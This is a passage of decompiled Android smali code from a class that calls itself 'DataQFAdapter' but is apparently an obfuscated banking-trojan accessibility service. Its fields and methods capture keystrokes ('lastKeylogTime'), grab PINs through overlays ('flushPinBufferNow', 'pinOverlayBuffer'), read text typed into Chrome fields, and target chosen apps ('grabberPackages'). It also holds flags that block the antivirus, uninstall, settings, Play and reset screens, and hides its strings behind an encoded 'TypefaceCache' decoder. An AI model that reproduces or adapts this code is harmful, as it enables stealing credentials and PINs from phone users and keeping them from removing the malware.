    invoke-virtual {v3, p1}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 25
    .line 26
    .line 27
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 28
    .line 29
    invoke-virtual {p1, v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 30
    .line 31
    .line 32
    iget-wide v3, v0, Lv/s/NxAMaDFbSCxW6M03f;->Ee8d2j4S9Vm5yGuR:J

    nop

    .line 33
    .line 34
    iput-wide v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastKeylogTime:J

    .line 35
    .line 36
    if-eqz v2, :cond_1

    .line 37
    .line 38
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->grabberPackages:Ljava/util/concurrent/ConcurrentHashMap$KeySetView;

    .line 39
    .line 40
    invoke-virtual {p1, v1}, Ljava/util/concurrent/ConcurrentHashMap$KeySetView;->contains(Ljava/lang/Object;)Z

    .line 41
    .line 42
    .line 43
    move-result p1

    .line 44
    if-eqz p1, :cond_1

    .line 45
    .line 46
    iget-object p1, v2, Lv/s/meoyWy7uMVp1IjcAV;->w9sT1Swbhx3hs:Ljava/lang/String;

    .line 47
    .line 48
    iget-object v0, v2, Lv/s/meoyWy7uMVp1IjcAV;->vekpFI4d1Nc4fakF:Ljava/lang/String;

    nop

    nop

    .line 49
    .line 50
    iget-object v3, v2, Lv/s/meoyWy7uMVp1IjcAV;->JXn4Qf7zpnLjP5:Ljava/lang/String;

    .line 51
    .line 52
    iget-boolean v2, v2, Lv/s/meoyWy7uMVp1IjcAV;->Ee8d2j4S9Vm5yGuR:Z

    .line 53
    .line 54
    invoke-static {v1, p1, v0, v3, v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 55
    .line 56
    .line 57
    :cond_1
    :goto_0
    return-void
.end method

.method private final flushPinBufferNow(Ljava/lang/String;)V
    .locals 6

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinFlushRunnable:Ljava/lang/Runnable;

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 6
    .line 7
    invoke-virtual {v1, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 8
    .line 9
    .line 10
    :cond_0
    const/4 v0, 0x0

    .line 11
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinFlushRunnable:Ljava/lang/Runnable;

    .line 12
    .line 13
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayBuffer:Ljava/util/HashMap;

    .line 14
    .line 15
    invoke-virtual {v0, p1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 16
    .line 17
    .line 18
    move-result-object v0

    .line 19
    check-cast v0, Ljava/lang/StringBuilder;

    .line 20
    .line 21
    if-eqz v0, :cond_1

    nop

    .line 22
    .line 23
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    .line 24
    .line 25
    .line 26
    move-result v1

    .line 27
    const/16 v2, 0x3

    nop

    add-int/lit8 v2, v2, 0x1

    .line 28
    if-lt v1, v2, :cond_1

    nop

    nop

    .line 29
    .line 30
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 31
    .line 32
    const-string v2, "0013005F007500C700F600B300C700B4002B002C001B"

    .line 33
    .line 34
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v2

    .line 38
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    .line 39
    .line 40
    .line 41
    move-result v3

    .line 42
    const-string v4, "006300720052008000F900AB00C100E700250079004900C7"

    .line 43
    .line 44
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 45
    .line 46
    .line 47
    move-result-object v4

    .line 48
    new-instance v5, Ljava/lang/StringBuilder;

    .line 49
    .line 50
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 51
    .line 52
    .line 53
    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 54
    .line 55
    .line 56
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 57
    .line 58
    .line 59
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 60
    .line 61
    .line 62
    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 63
    .line 64
    .line 65
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v2

    .line 69
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 70
    .line 71
    .line 72
    invoke-static {v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 73
    .line 74
    .line 75
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 76
    .line 77
    .line 78
    move-result-wide v1

    .line 79
    iput-wide v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinGrabTime:J

    .line 80
    .line 81
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object v1

    .line 85
    const-string v2, "0033007F0055"

    .line 86
    .line 87
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 88
    .line 89
    .line 90
    move-result-object v2

    .line 91
    const-string v3, "0033007F005500B800FF00A900D700B5002F00770042"

    .line 92
    .line 93
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 94
    .line 95
    .line 96
    move-result-object v3

    .line 97
    const/16 v4, 0x3e

    add-int/lit8 v4, v4, -0x3d

    .line 98
    invoke-static {p1, v1, v2, v3, v4}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 99
    .line 100
    .line 101
    const/4 p1, 0x0

    nop

    nop

    .line 102
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 103
    .line 104
    .line 105
    :cond_1
    return-void
.end method

.method public static synthetic gIIiyi2ddlMDR0(Lapp/mobilex/plus/services/DataQFAdapter;Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 0

    .line 1
    invoke-static {p0, p1, p2, p3}, Lapp/mobilex/plus/services/DataQFAdapter;->preAddPinOverlay$lambda$66(Lapp/mobilex/plus/services/DataQFAdapter;Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z

    .line 2
    .line 3
    .line 4
    move-result p0

    .line 5
    return p0

    nop
.end method

.method private final getForegroundPackage()Ljava/lang/String;
    .locals 5

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getWindows()Ljava/util/List;

    .line 3
    .line 4
    .line 5
    move-result-object v1

    .line 6
    if-nez v1, :cond_0

    .line 7
    .line 8
    return-object v0

    .line 9
    :cond_0
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 10
    .line 11
    .line 12
    move-result-object v1

    .line 13
    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 14
    .line 15
    .line 16
    move-result v2

    .line 17
    if-eqz v2, :cond_4

    .line 18
    .line 19
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 20
    .line 21
    .line 22
    move-result-object v2

    nop

    .line 23
    check-cast v2, Landroid/view/accessibility/AccessibilityWindowInfo;

    .line 24
    .line 25
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityWindowInfo;->getType()I

    .line 26
    .line 27
    .line 28
    move-result v3

    .line 29
    const/16 v4, 0x1

    .line 30
    if-ne v3, v4, :cond_1

    .line 31
    .line 32
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityWindowInfo;->isActive()Z

    .line 33
    .line 34
    .line 35
    move-result v3

    .line 36
    if-eqz v3, :cond_1

    .line 37
    .line 38
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityWindowInfo;->getRoot()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 39
    .line 40
    .line 41
    move-result-object v1

    .line 42
    if-eqz v1, :cond_2

    .line 43
    .line 44
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    .line 45
    .line 46
    .line 47
    move-result-object v2

    nop

    nop

    .line 48
    if-eqz v2, :cond_2

    .line 49
    .line 50
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 51
    .line 52
    .line 53
    move-result-object v2

    .line 54
    goto :goto_0

    .line 55
    :cond_2
    move-object v2, v0

    nop

    nop

    .line 56
    :goto_0
    if-eqz v1, :cond_3

    .line 57
    .line 58
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 59
    .line 60
    .line 61
    :cond_3
    return-object v2

    .line 62
    :catchall_0
    :cond_4
    return-object v0
.end method

.method public static final getPendingForceStop()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPendingForceStop$cp()Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    return-object v0
.end method

.method public static final getPendingUninstallPkg()Ljava/lang/String;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getPendingUninstallPkg$cp()Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    return-object v0
.end method

.method private final getRealScreenSize()Lv/s/yI1KTRoNlsjx;
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Lv/s/yI1KTRoNlsjx;"
        }
    .end annotation

    .line 1
    :try_start_0
    const-string v0, "window"

    .line 2
    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/view/WindowManager;

    .line 8
    .line 9
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 10
    .line 11
    const/16 v2, 0x1e

    .line 12
    .line 13
    if-lt v1, v2, :cond_0

    .line 14
    .line 15
    invoke-static {v0}, Lv/s/VhkhkItRHoue;->pyu8ovAipBTLYAiKab(Landroid/view/WindowManager;)Landroid/view/WindowMetrics;

    .line 16
    .line 17
    .line 18
    move-result-object v0

    .line 19
    invoke-static {v0}, Lv/s/VhkhkItRHoue;->xDyLpEZyrcKVe0(Landroid/view/WindowMetrics;)Landroid/graphics/Rect;

    .line 20
    .line 21
    .line 22
    move-result-object v0

    .line 23
    new-instance v1, Lv/s/yI1KTRoNlsjx;

    .line 24
    .line 25
    invoke-virtual {v0}, Landroid/graphics/Rect;->width()I

    .line 26
    .line 27
    .line 28
    move-result v2

    .line 29
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 30
    .line 31
    .line 32
    move-result-object v2

    .line 33
    invoke-virtual {v0}, Landroid/graphics/Rect;->height()I

    .line 34
    .line 35
    .line 36
    move-result v0

    .line 37
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 38
    .line 39
    .line 40
    move-result-object v0

    .line 41
    invoke-direct {v1, v2, v0}, Lv/s/yI1KTRoNlsjx;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    .line 42
    .line 43
    .line 44
    return-object v1

    .line 45
    :cond_0
    new-instance v1, Landroid/graphics/Point;

    .line 46
    .line 47
    invoke-direct {v1}, Landroid/graphics/Point;-><init>()V

    .line 48
    .line 49
    .line 50
    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    .line 51
    .line 52
    .line 53
    move-result-object v0

    .line 54
    invoke-virtual {v0, v1}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 55
    .line 56
    .line 57
    new-instance v0, Lv/s/yI1KTRoNlsjx;

    .line 58
    .line 59
    iget v2, v1, Landroid/graphics/Point;->x:I

    .line 60
    .line 61
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 62
    .line 63
    .line 64
    move-result-object v2

    nop

    nop

    .line 65
    iget v1, v1, Landroid/graphics/Point;->y:I

    .line 66
    .line 67
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 68
    .line 69
    .line 70
    move-result-object v1

    .line 71
    invoke-direct {v0, v2, v1}, Lv/s/yI1KTRoNlsjx;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 72
    .line 73
    .line 74
    return-object v0

    .line 75
    :catch_0
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 76
    .line 77
    .line 78
    move-result-object v0

    .line 79
    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 80
    .line 81
    .line 82
    move-result-object v0

    .line 83
    new-instance v1, Lv/s/yI1KTRoNlsjx;

    .line 84
    .line 85
    iget v2, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    .line 86
    .line 87
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 88
    .line 89
    .line 90
    move-result-object v2

    .line 91
    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    .line 92
    .line 93
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 94
    .line 95
    .line 96
    move-result-object v0

    .line 97
    invoke-direct {v1, v2, v0}, Lv/s/yI1KTRoNlsjx;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    .line 98
    .line 99
    .line 100
    return-object v1
.end method

.method private final getRealText(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 4

    .line 1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const-string v1, ""

    nop

    .line 6
    .line 7
    if-eqz v0, :cond_6

    .line 8
    .line 9
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 10
    .line 11
    .line 12
    move-result-object v0

    .line 13
    if-nez v0, :cond_0

    .line 14
    .line 15
    goto :goto_0

    .line 16
    :cond_0
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 17
    .line 18
    .line 19
    move-result v2

    .line 20
    if-nez v2, :cond_1

    .line 21
    .line 22
    return-object v1

    .line 23
    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 24
    .line 25
    .line 26
    move-result-object v2

    .line 27
    if-eqz v2, :cond_2

    .line 28
    .line 29
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v2

    .line 33
    if-nez v2, :cond_3

    .line 34
    .line 35
    :cond_2
    move-object/from16 v2, v1

    .line 36
    :cond_3
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    .line 37
    .line 38
    .line 39
    move-result v3

    .line 40
    if-lez v3, :cond_4

    .line 41
    .line 42
    invoke-virtual {v0, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 43
    .line 44
    .line 45
    move-result v2

    .line 46
    if-eqz v2, :cond_4

    .line 47
    .line 48
    return-object v1

    nop

    nop

    .line 49
    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isShowingHintText()Z

    .line 50
    .line 51
    .line 52
    move-result p1

    .line 53
    if-eqz p1, :cond_5

    .line 54
    .line 55
    return-object v1

    .line 56
    :cond_5
    return-object v0

    .line 57
    :cond_6
    :goto_0
    return-object v1
.end method

.method public static final getUIBlock_A11y()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_A11y$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_AV()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_AV$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Browser()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Browser$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Dev()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Dev$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Files()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Files$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Lock()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    nop

    nop

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Lock$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Net()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Net$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0

    nop
.end method

.method public static final getUIBlock_OwnApp()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_OwnApp$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Play()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Play$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    nop

    nop

    .line 10
    return v0
.end method

.method public static final getUIBlock_Power()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Power$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Recents()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Recents$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Reset()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Reset$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0

    nop
.end method

.method public static final getUIBlock_Sett()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Sett$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Shade()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Shade$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUIBlock_Unin()Z
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Unin$cp()Z

    .line 7
    .line 8
    .line 9
    move-result v0

    .line 10
    return v0
.end method

.method public static final getUiBlockStatus()Lorg/json/JSONObject;
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->MLSIo1htfMPWeB8V876L()Lorg/json/JSONObject;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    return-object v0
.end method

.method public static synthetic gmNWMfvn6zlEj(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->onServiceConnected$lambda$23(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private final handleChromeTextChange(Landroid/view/accessibility/AccessibilityEvent;Ljava/lang/String;)V
    .locals 13

    .line 1
    const-string v0, "00360064005700B800F200BE00C0"

    .line 2
    .line 3
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 4
    .line 5
    .line 6
    move-result-object p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_4

    .line 7
    if-nez p1, :cond_0

    .line 8
    .line 9
    goto/16 :goto_a

    .line 10
    .line 11
    :cond_0
    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEditable()Z

    .line 12
    .line 13
    .line 14
    move-result v1

    nop

    nop
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_5

    .line 15
    if-nez v1, :cond_1

    .line 16
    .line 17
    :try_start_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 18
    .line 19
    .line 20
    :catchall_0
    return-void

    .line 21
    :cond_1
    :try_start_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 22
    .line 23
    .line 24
    move-result-object v1

    .line 25
    if-eqz v1, :cond_c

    .line 26
    .line 27
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v4

    .line 31
    if-nez v4, :cond_2

    .line 32
    .line 33
    goto/16 :goto_9

    nop

    nop

    .line 34
    .line 35
    :cond_2
    invoke-interface {v4}, Ljava/lang/CharSequence;->length()I

    .line 36
    .line 37
    .line 38
    move-result v1
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_5

    .line 39
    if-nez v1, :cond_3

    .line 40
    .line 41
    :try_start_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 42
    .line 43
    .line 44
    :catchall_1
    return-void

    .line 45
    :cond_3
    :try_start_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    move-result-object v1
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_5

    .line 49
    const-string v2, ""

    .line 50
    .line 51
    if-nez v1, :cond_4

    nop

    nop

    .line 52
    .line 53
    move-object/from16 v11, v2

    .line 54
    goto :goto_0

    .line 55
    :cond_4
    move-object v11, v1

    .line 56
    :goto_0
    :try_start_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getHintText()Ljava/lang/CharSequence;

    .line 57
    .line 58
    .line 59
    move-result-object v1

    .line 60
    if-eqz v1, :cond_6

    .line 61
    .line 62
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v1

    nop

    .line 66
    if-nez v1, :cond_5

    .line 67
    .line 68
    goto/16 :goto_1

    .line 69
    :cond_5
    move-object/from16 v7, v1

    .line 70
    goto/16 :goto_2

    .line 71
    :cond_6
    :goto_1
    move-object v7, v2

    .line 72
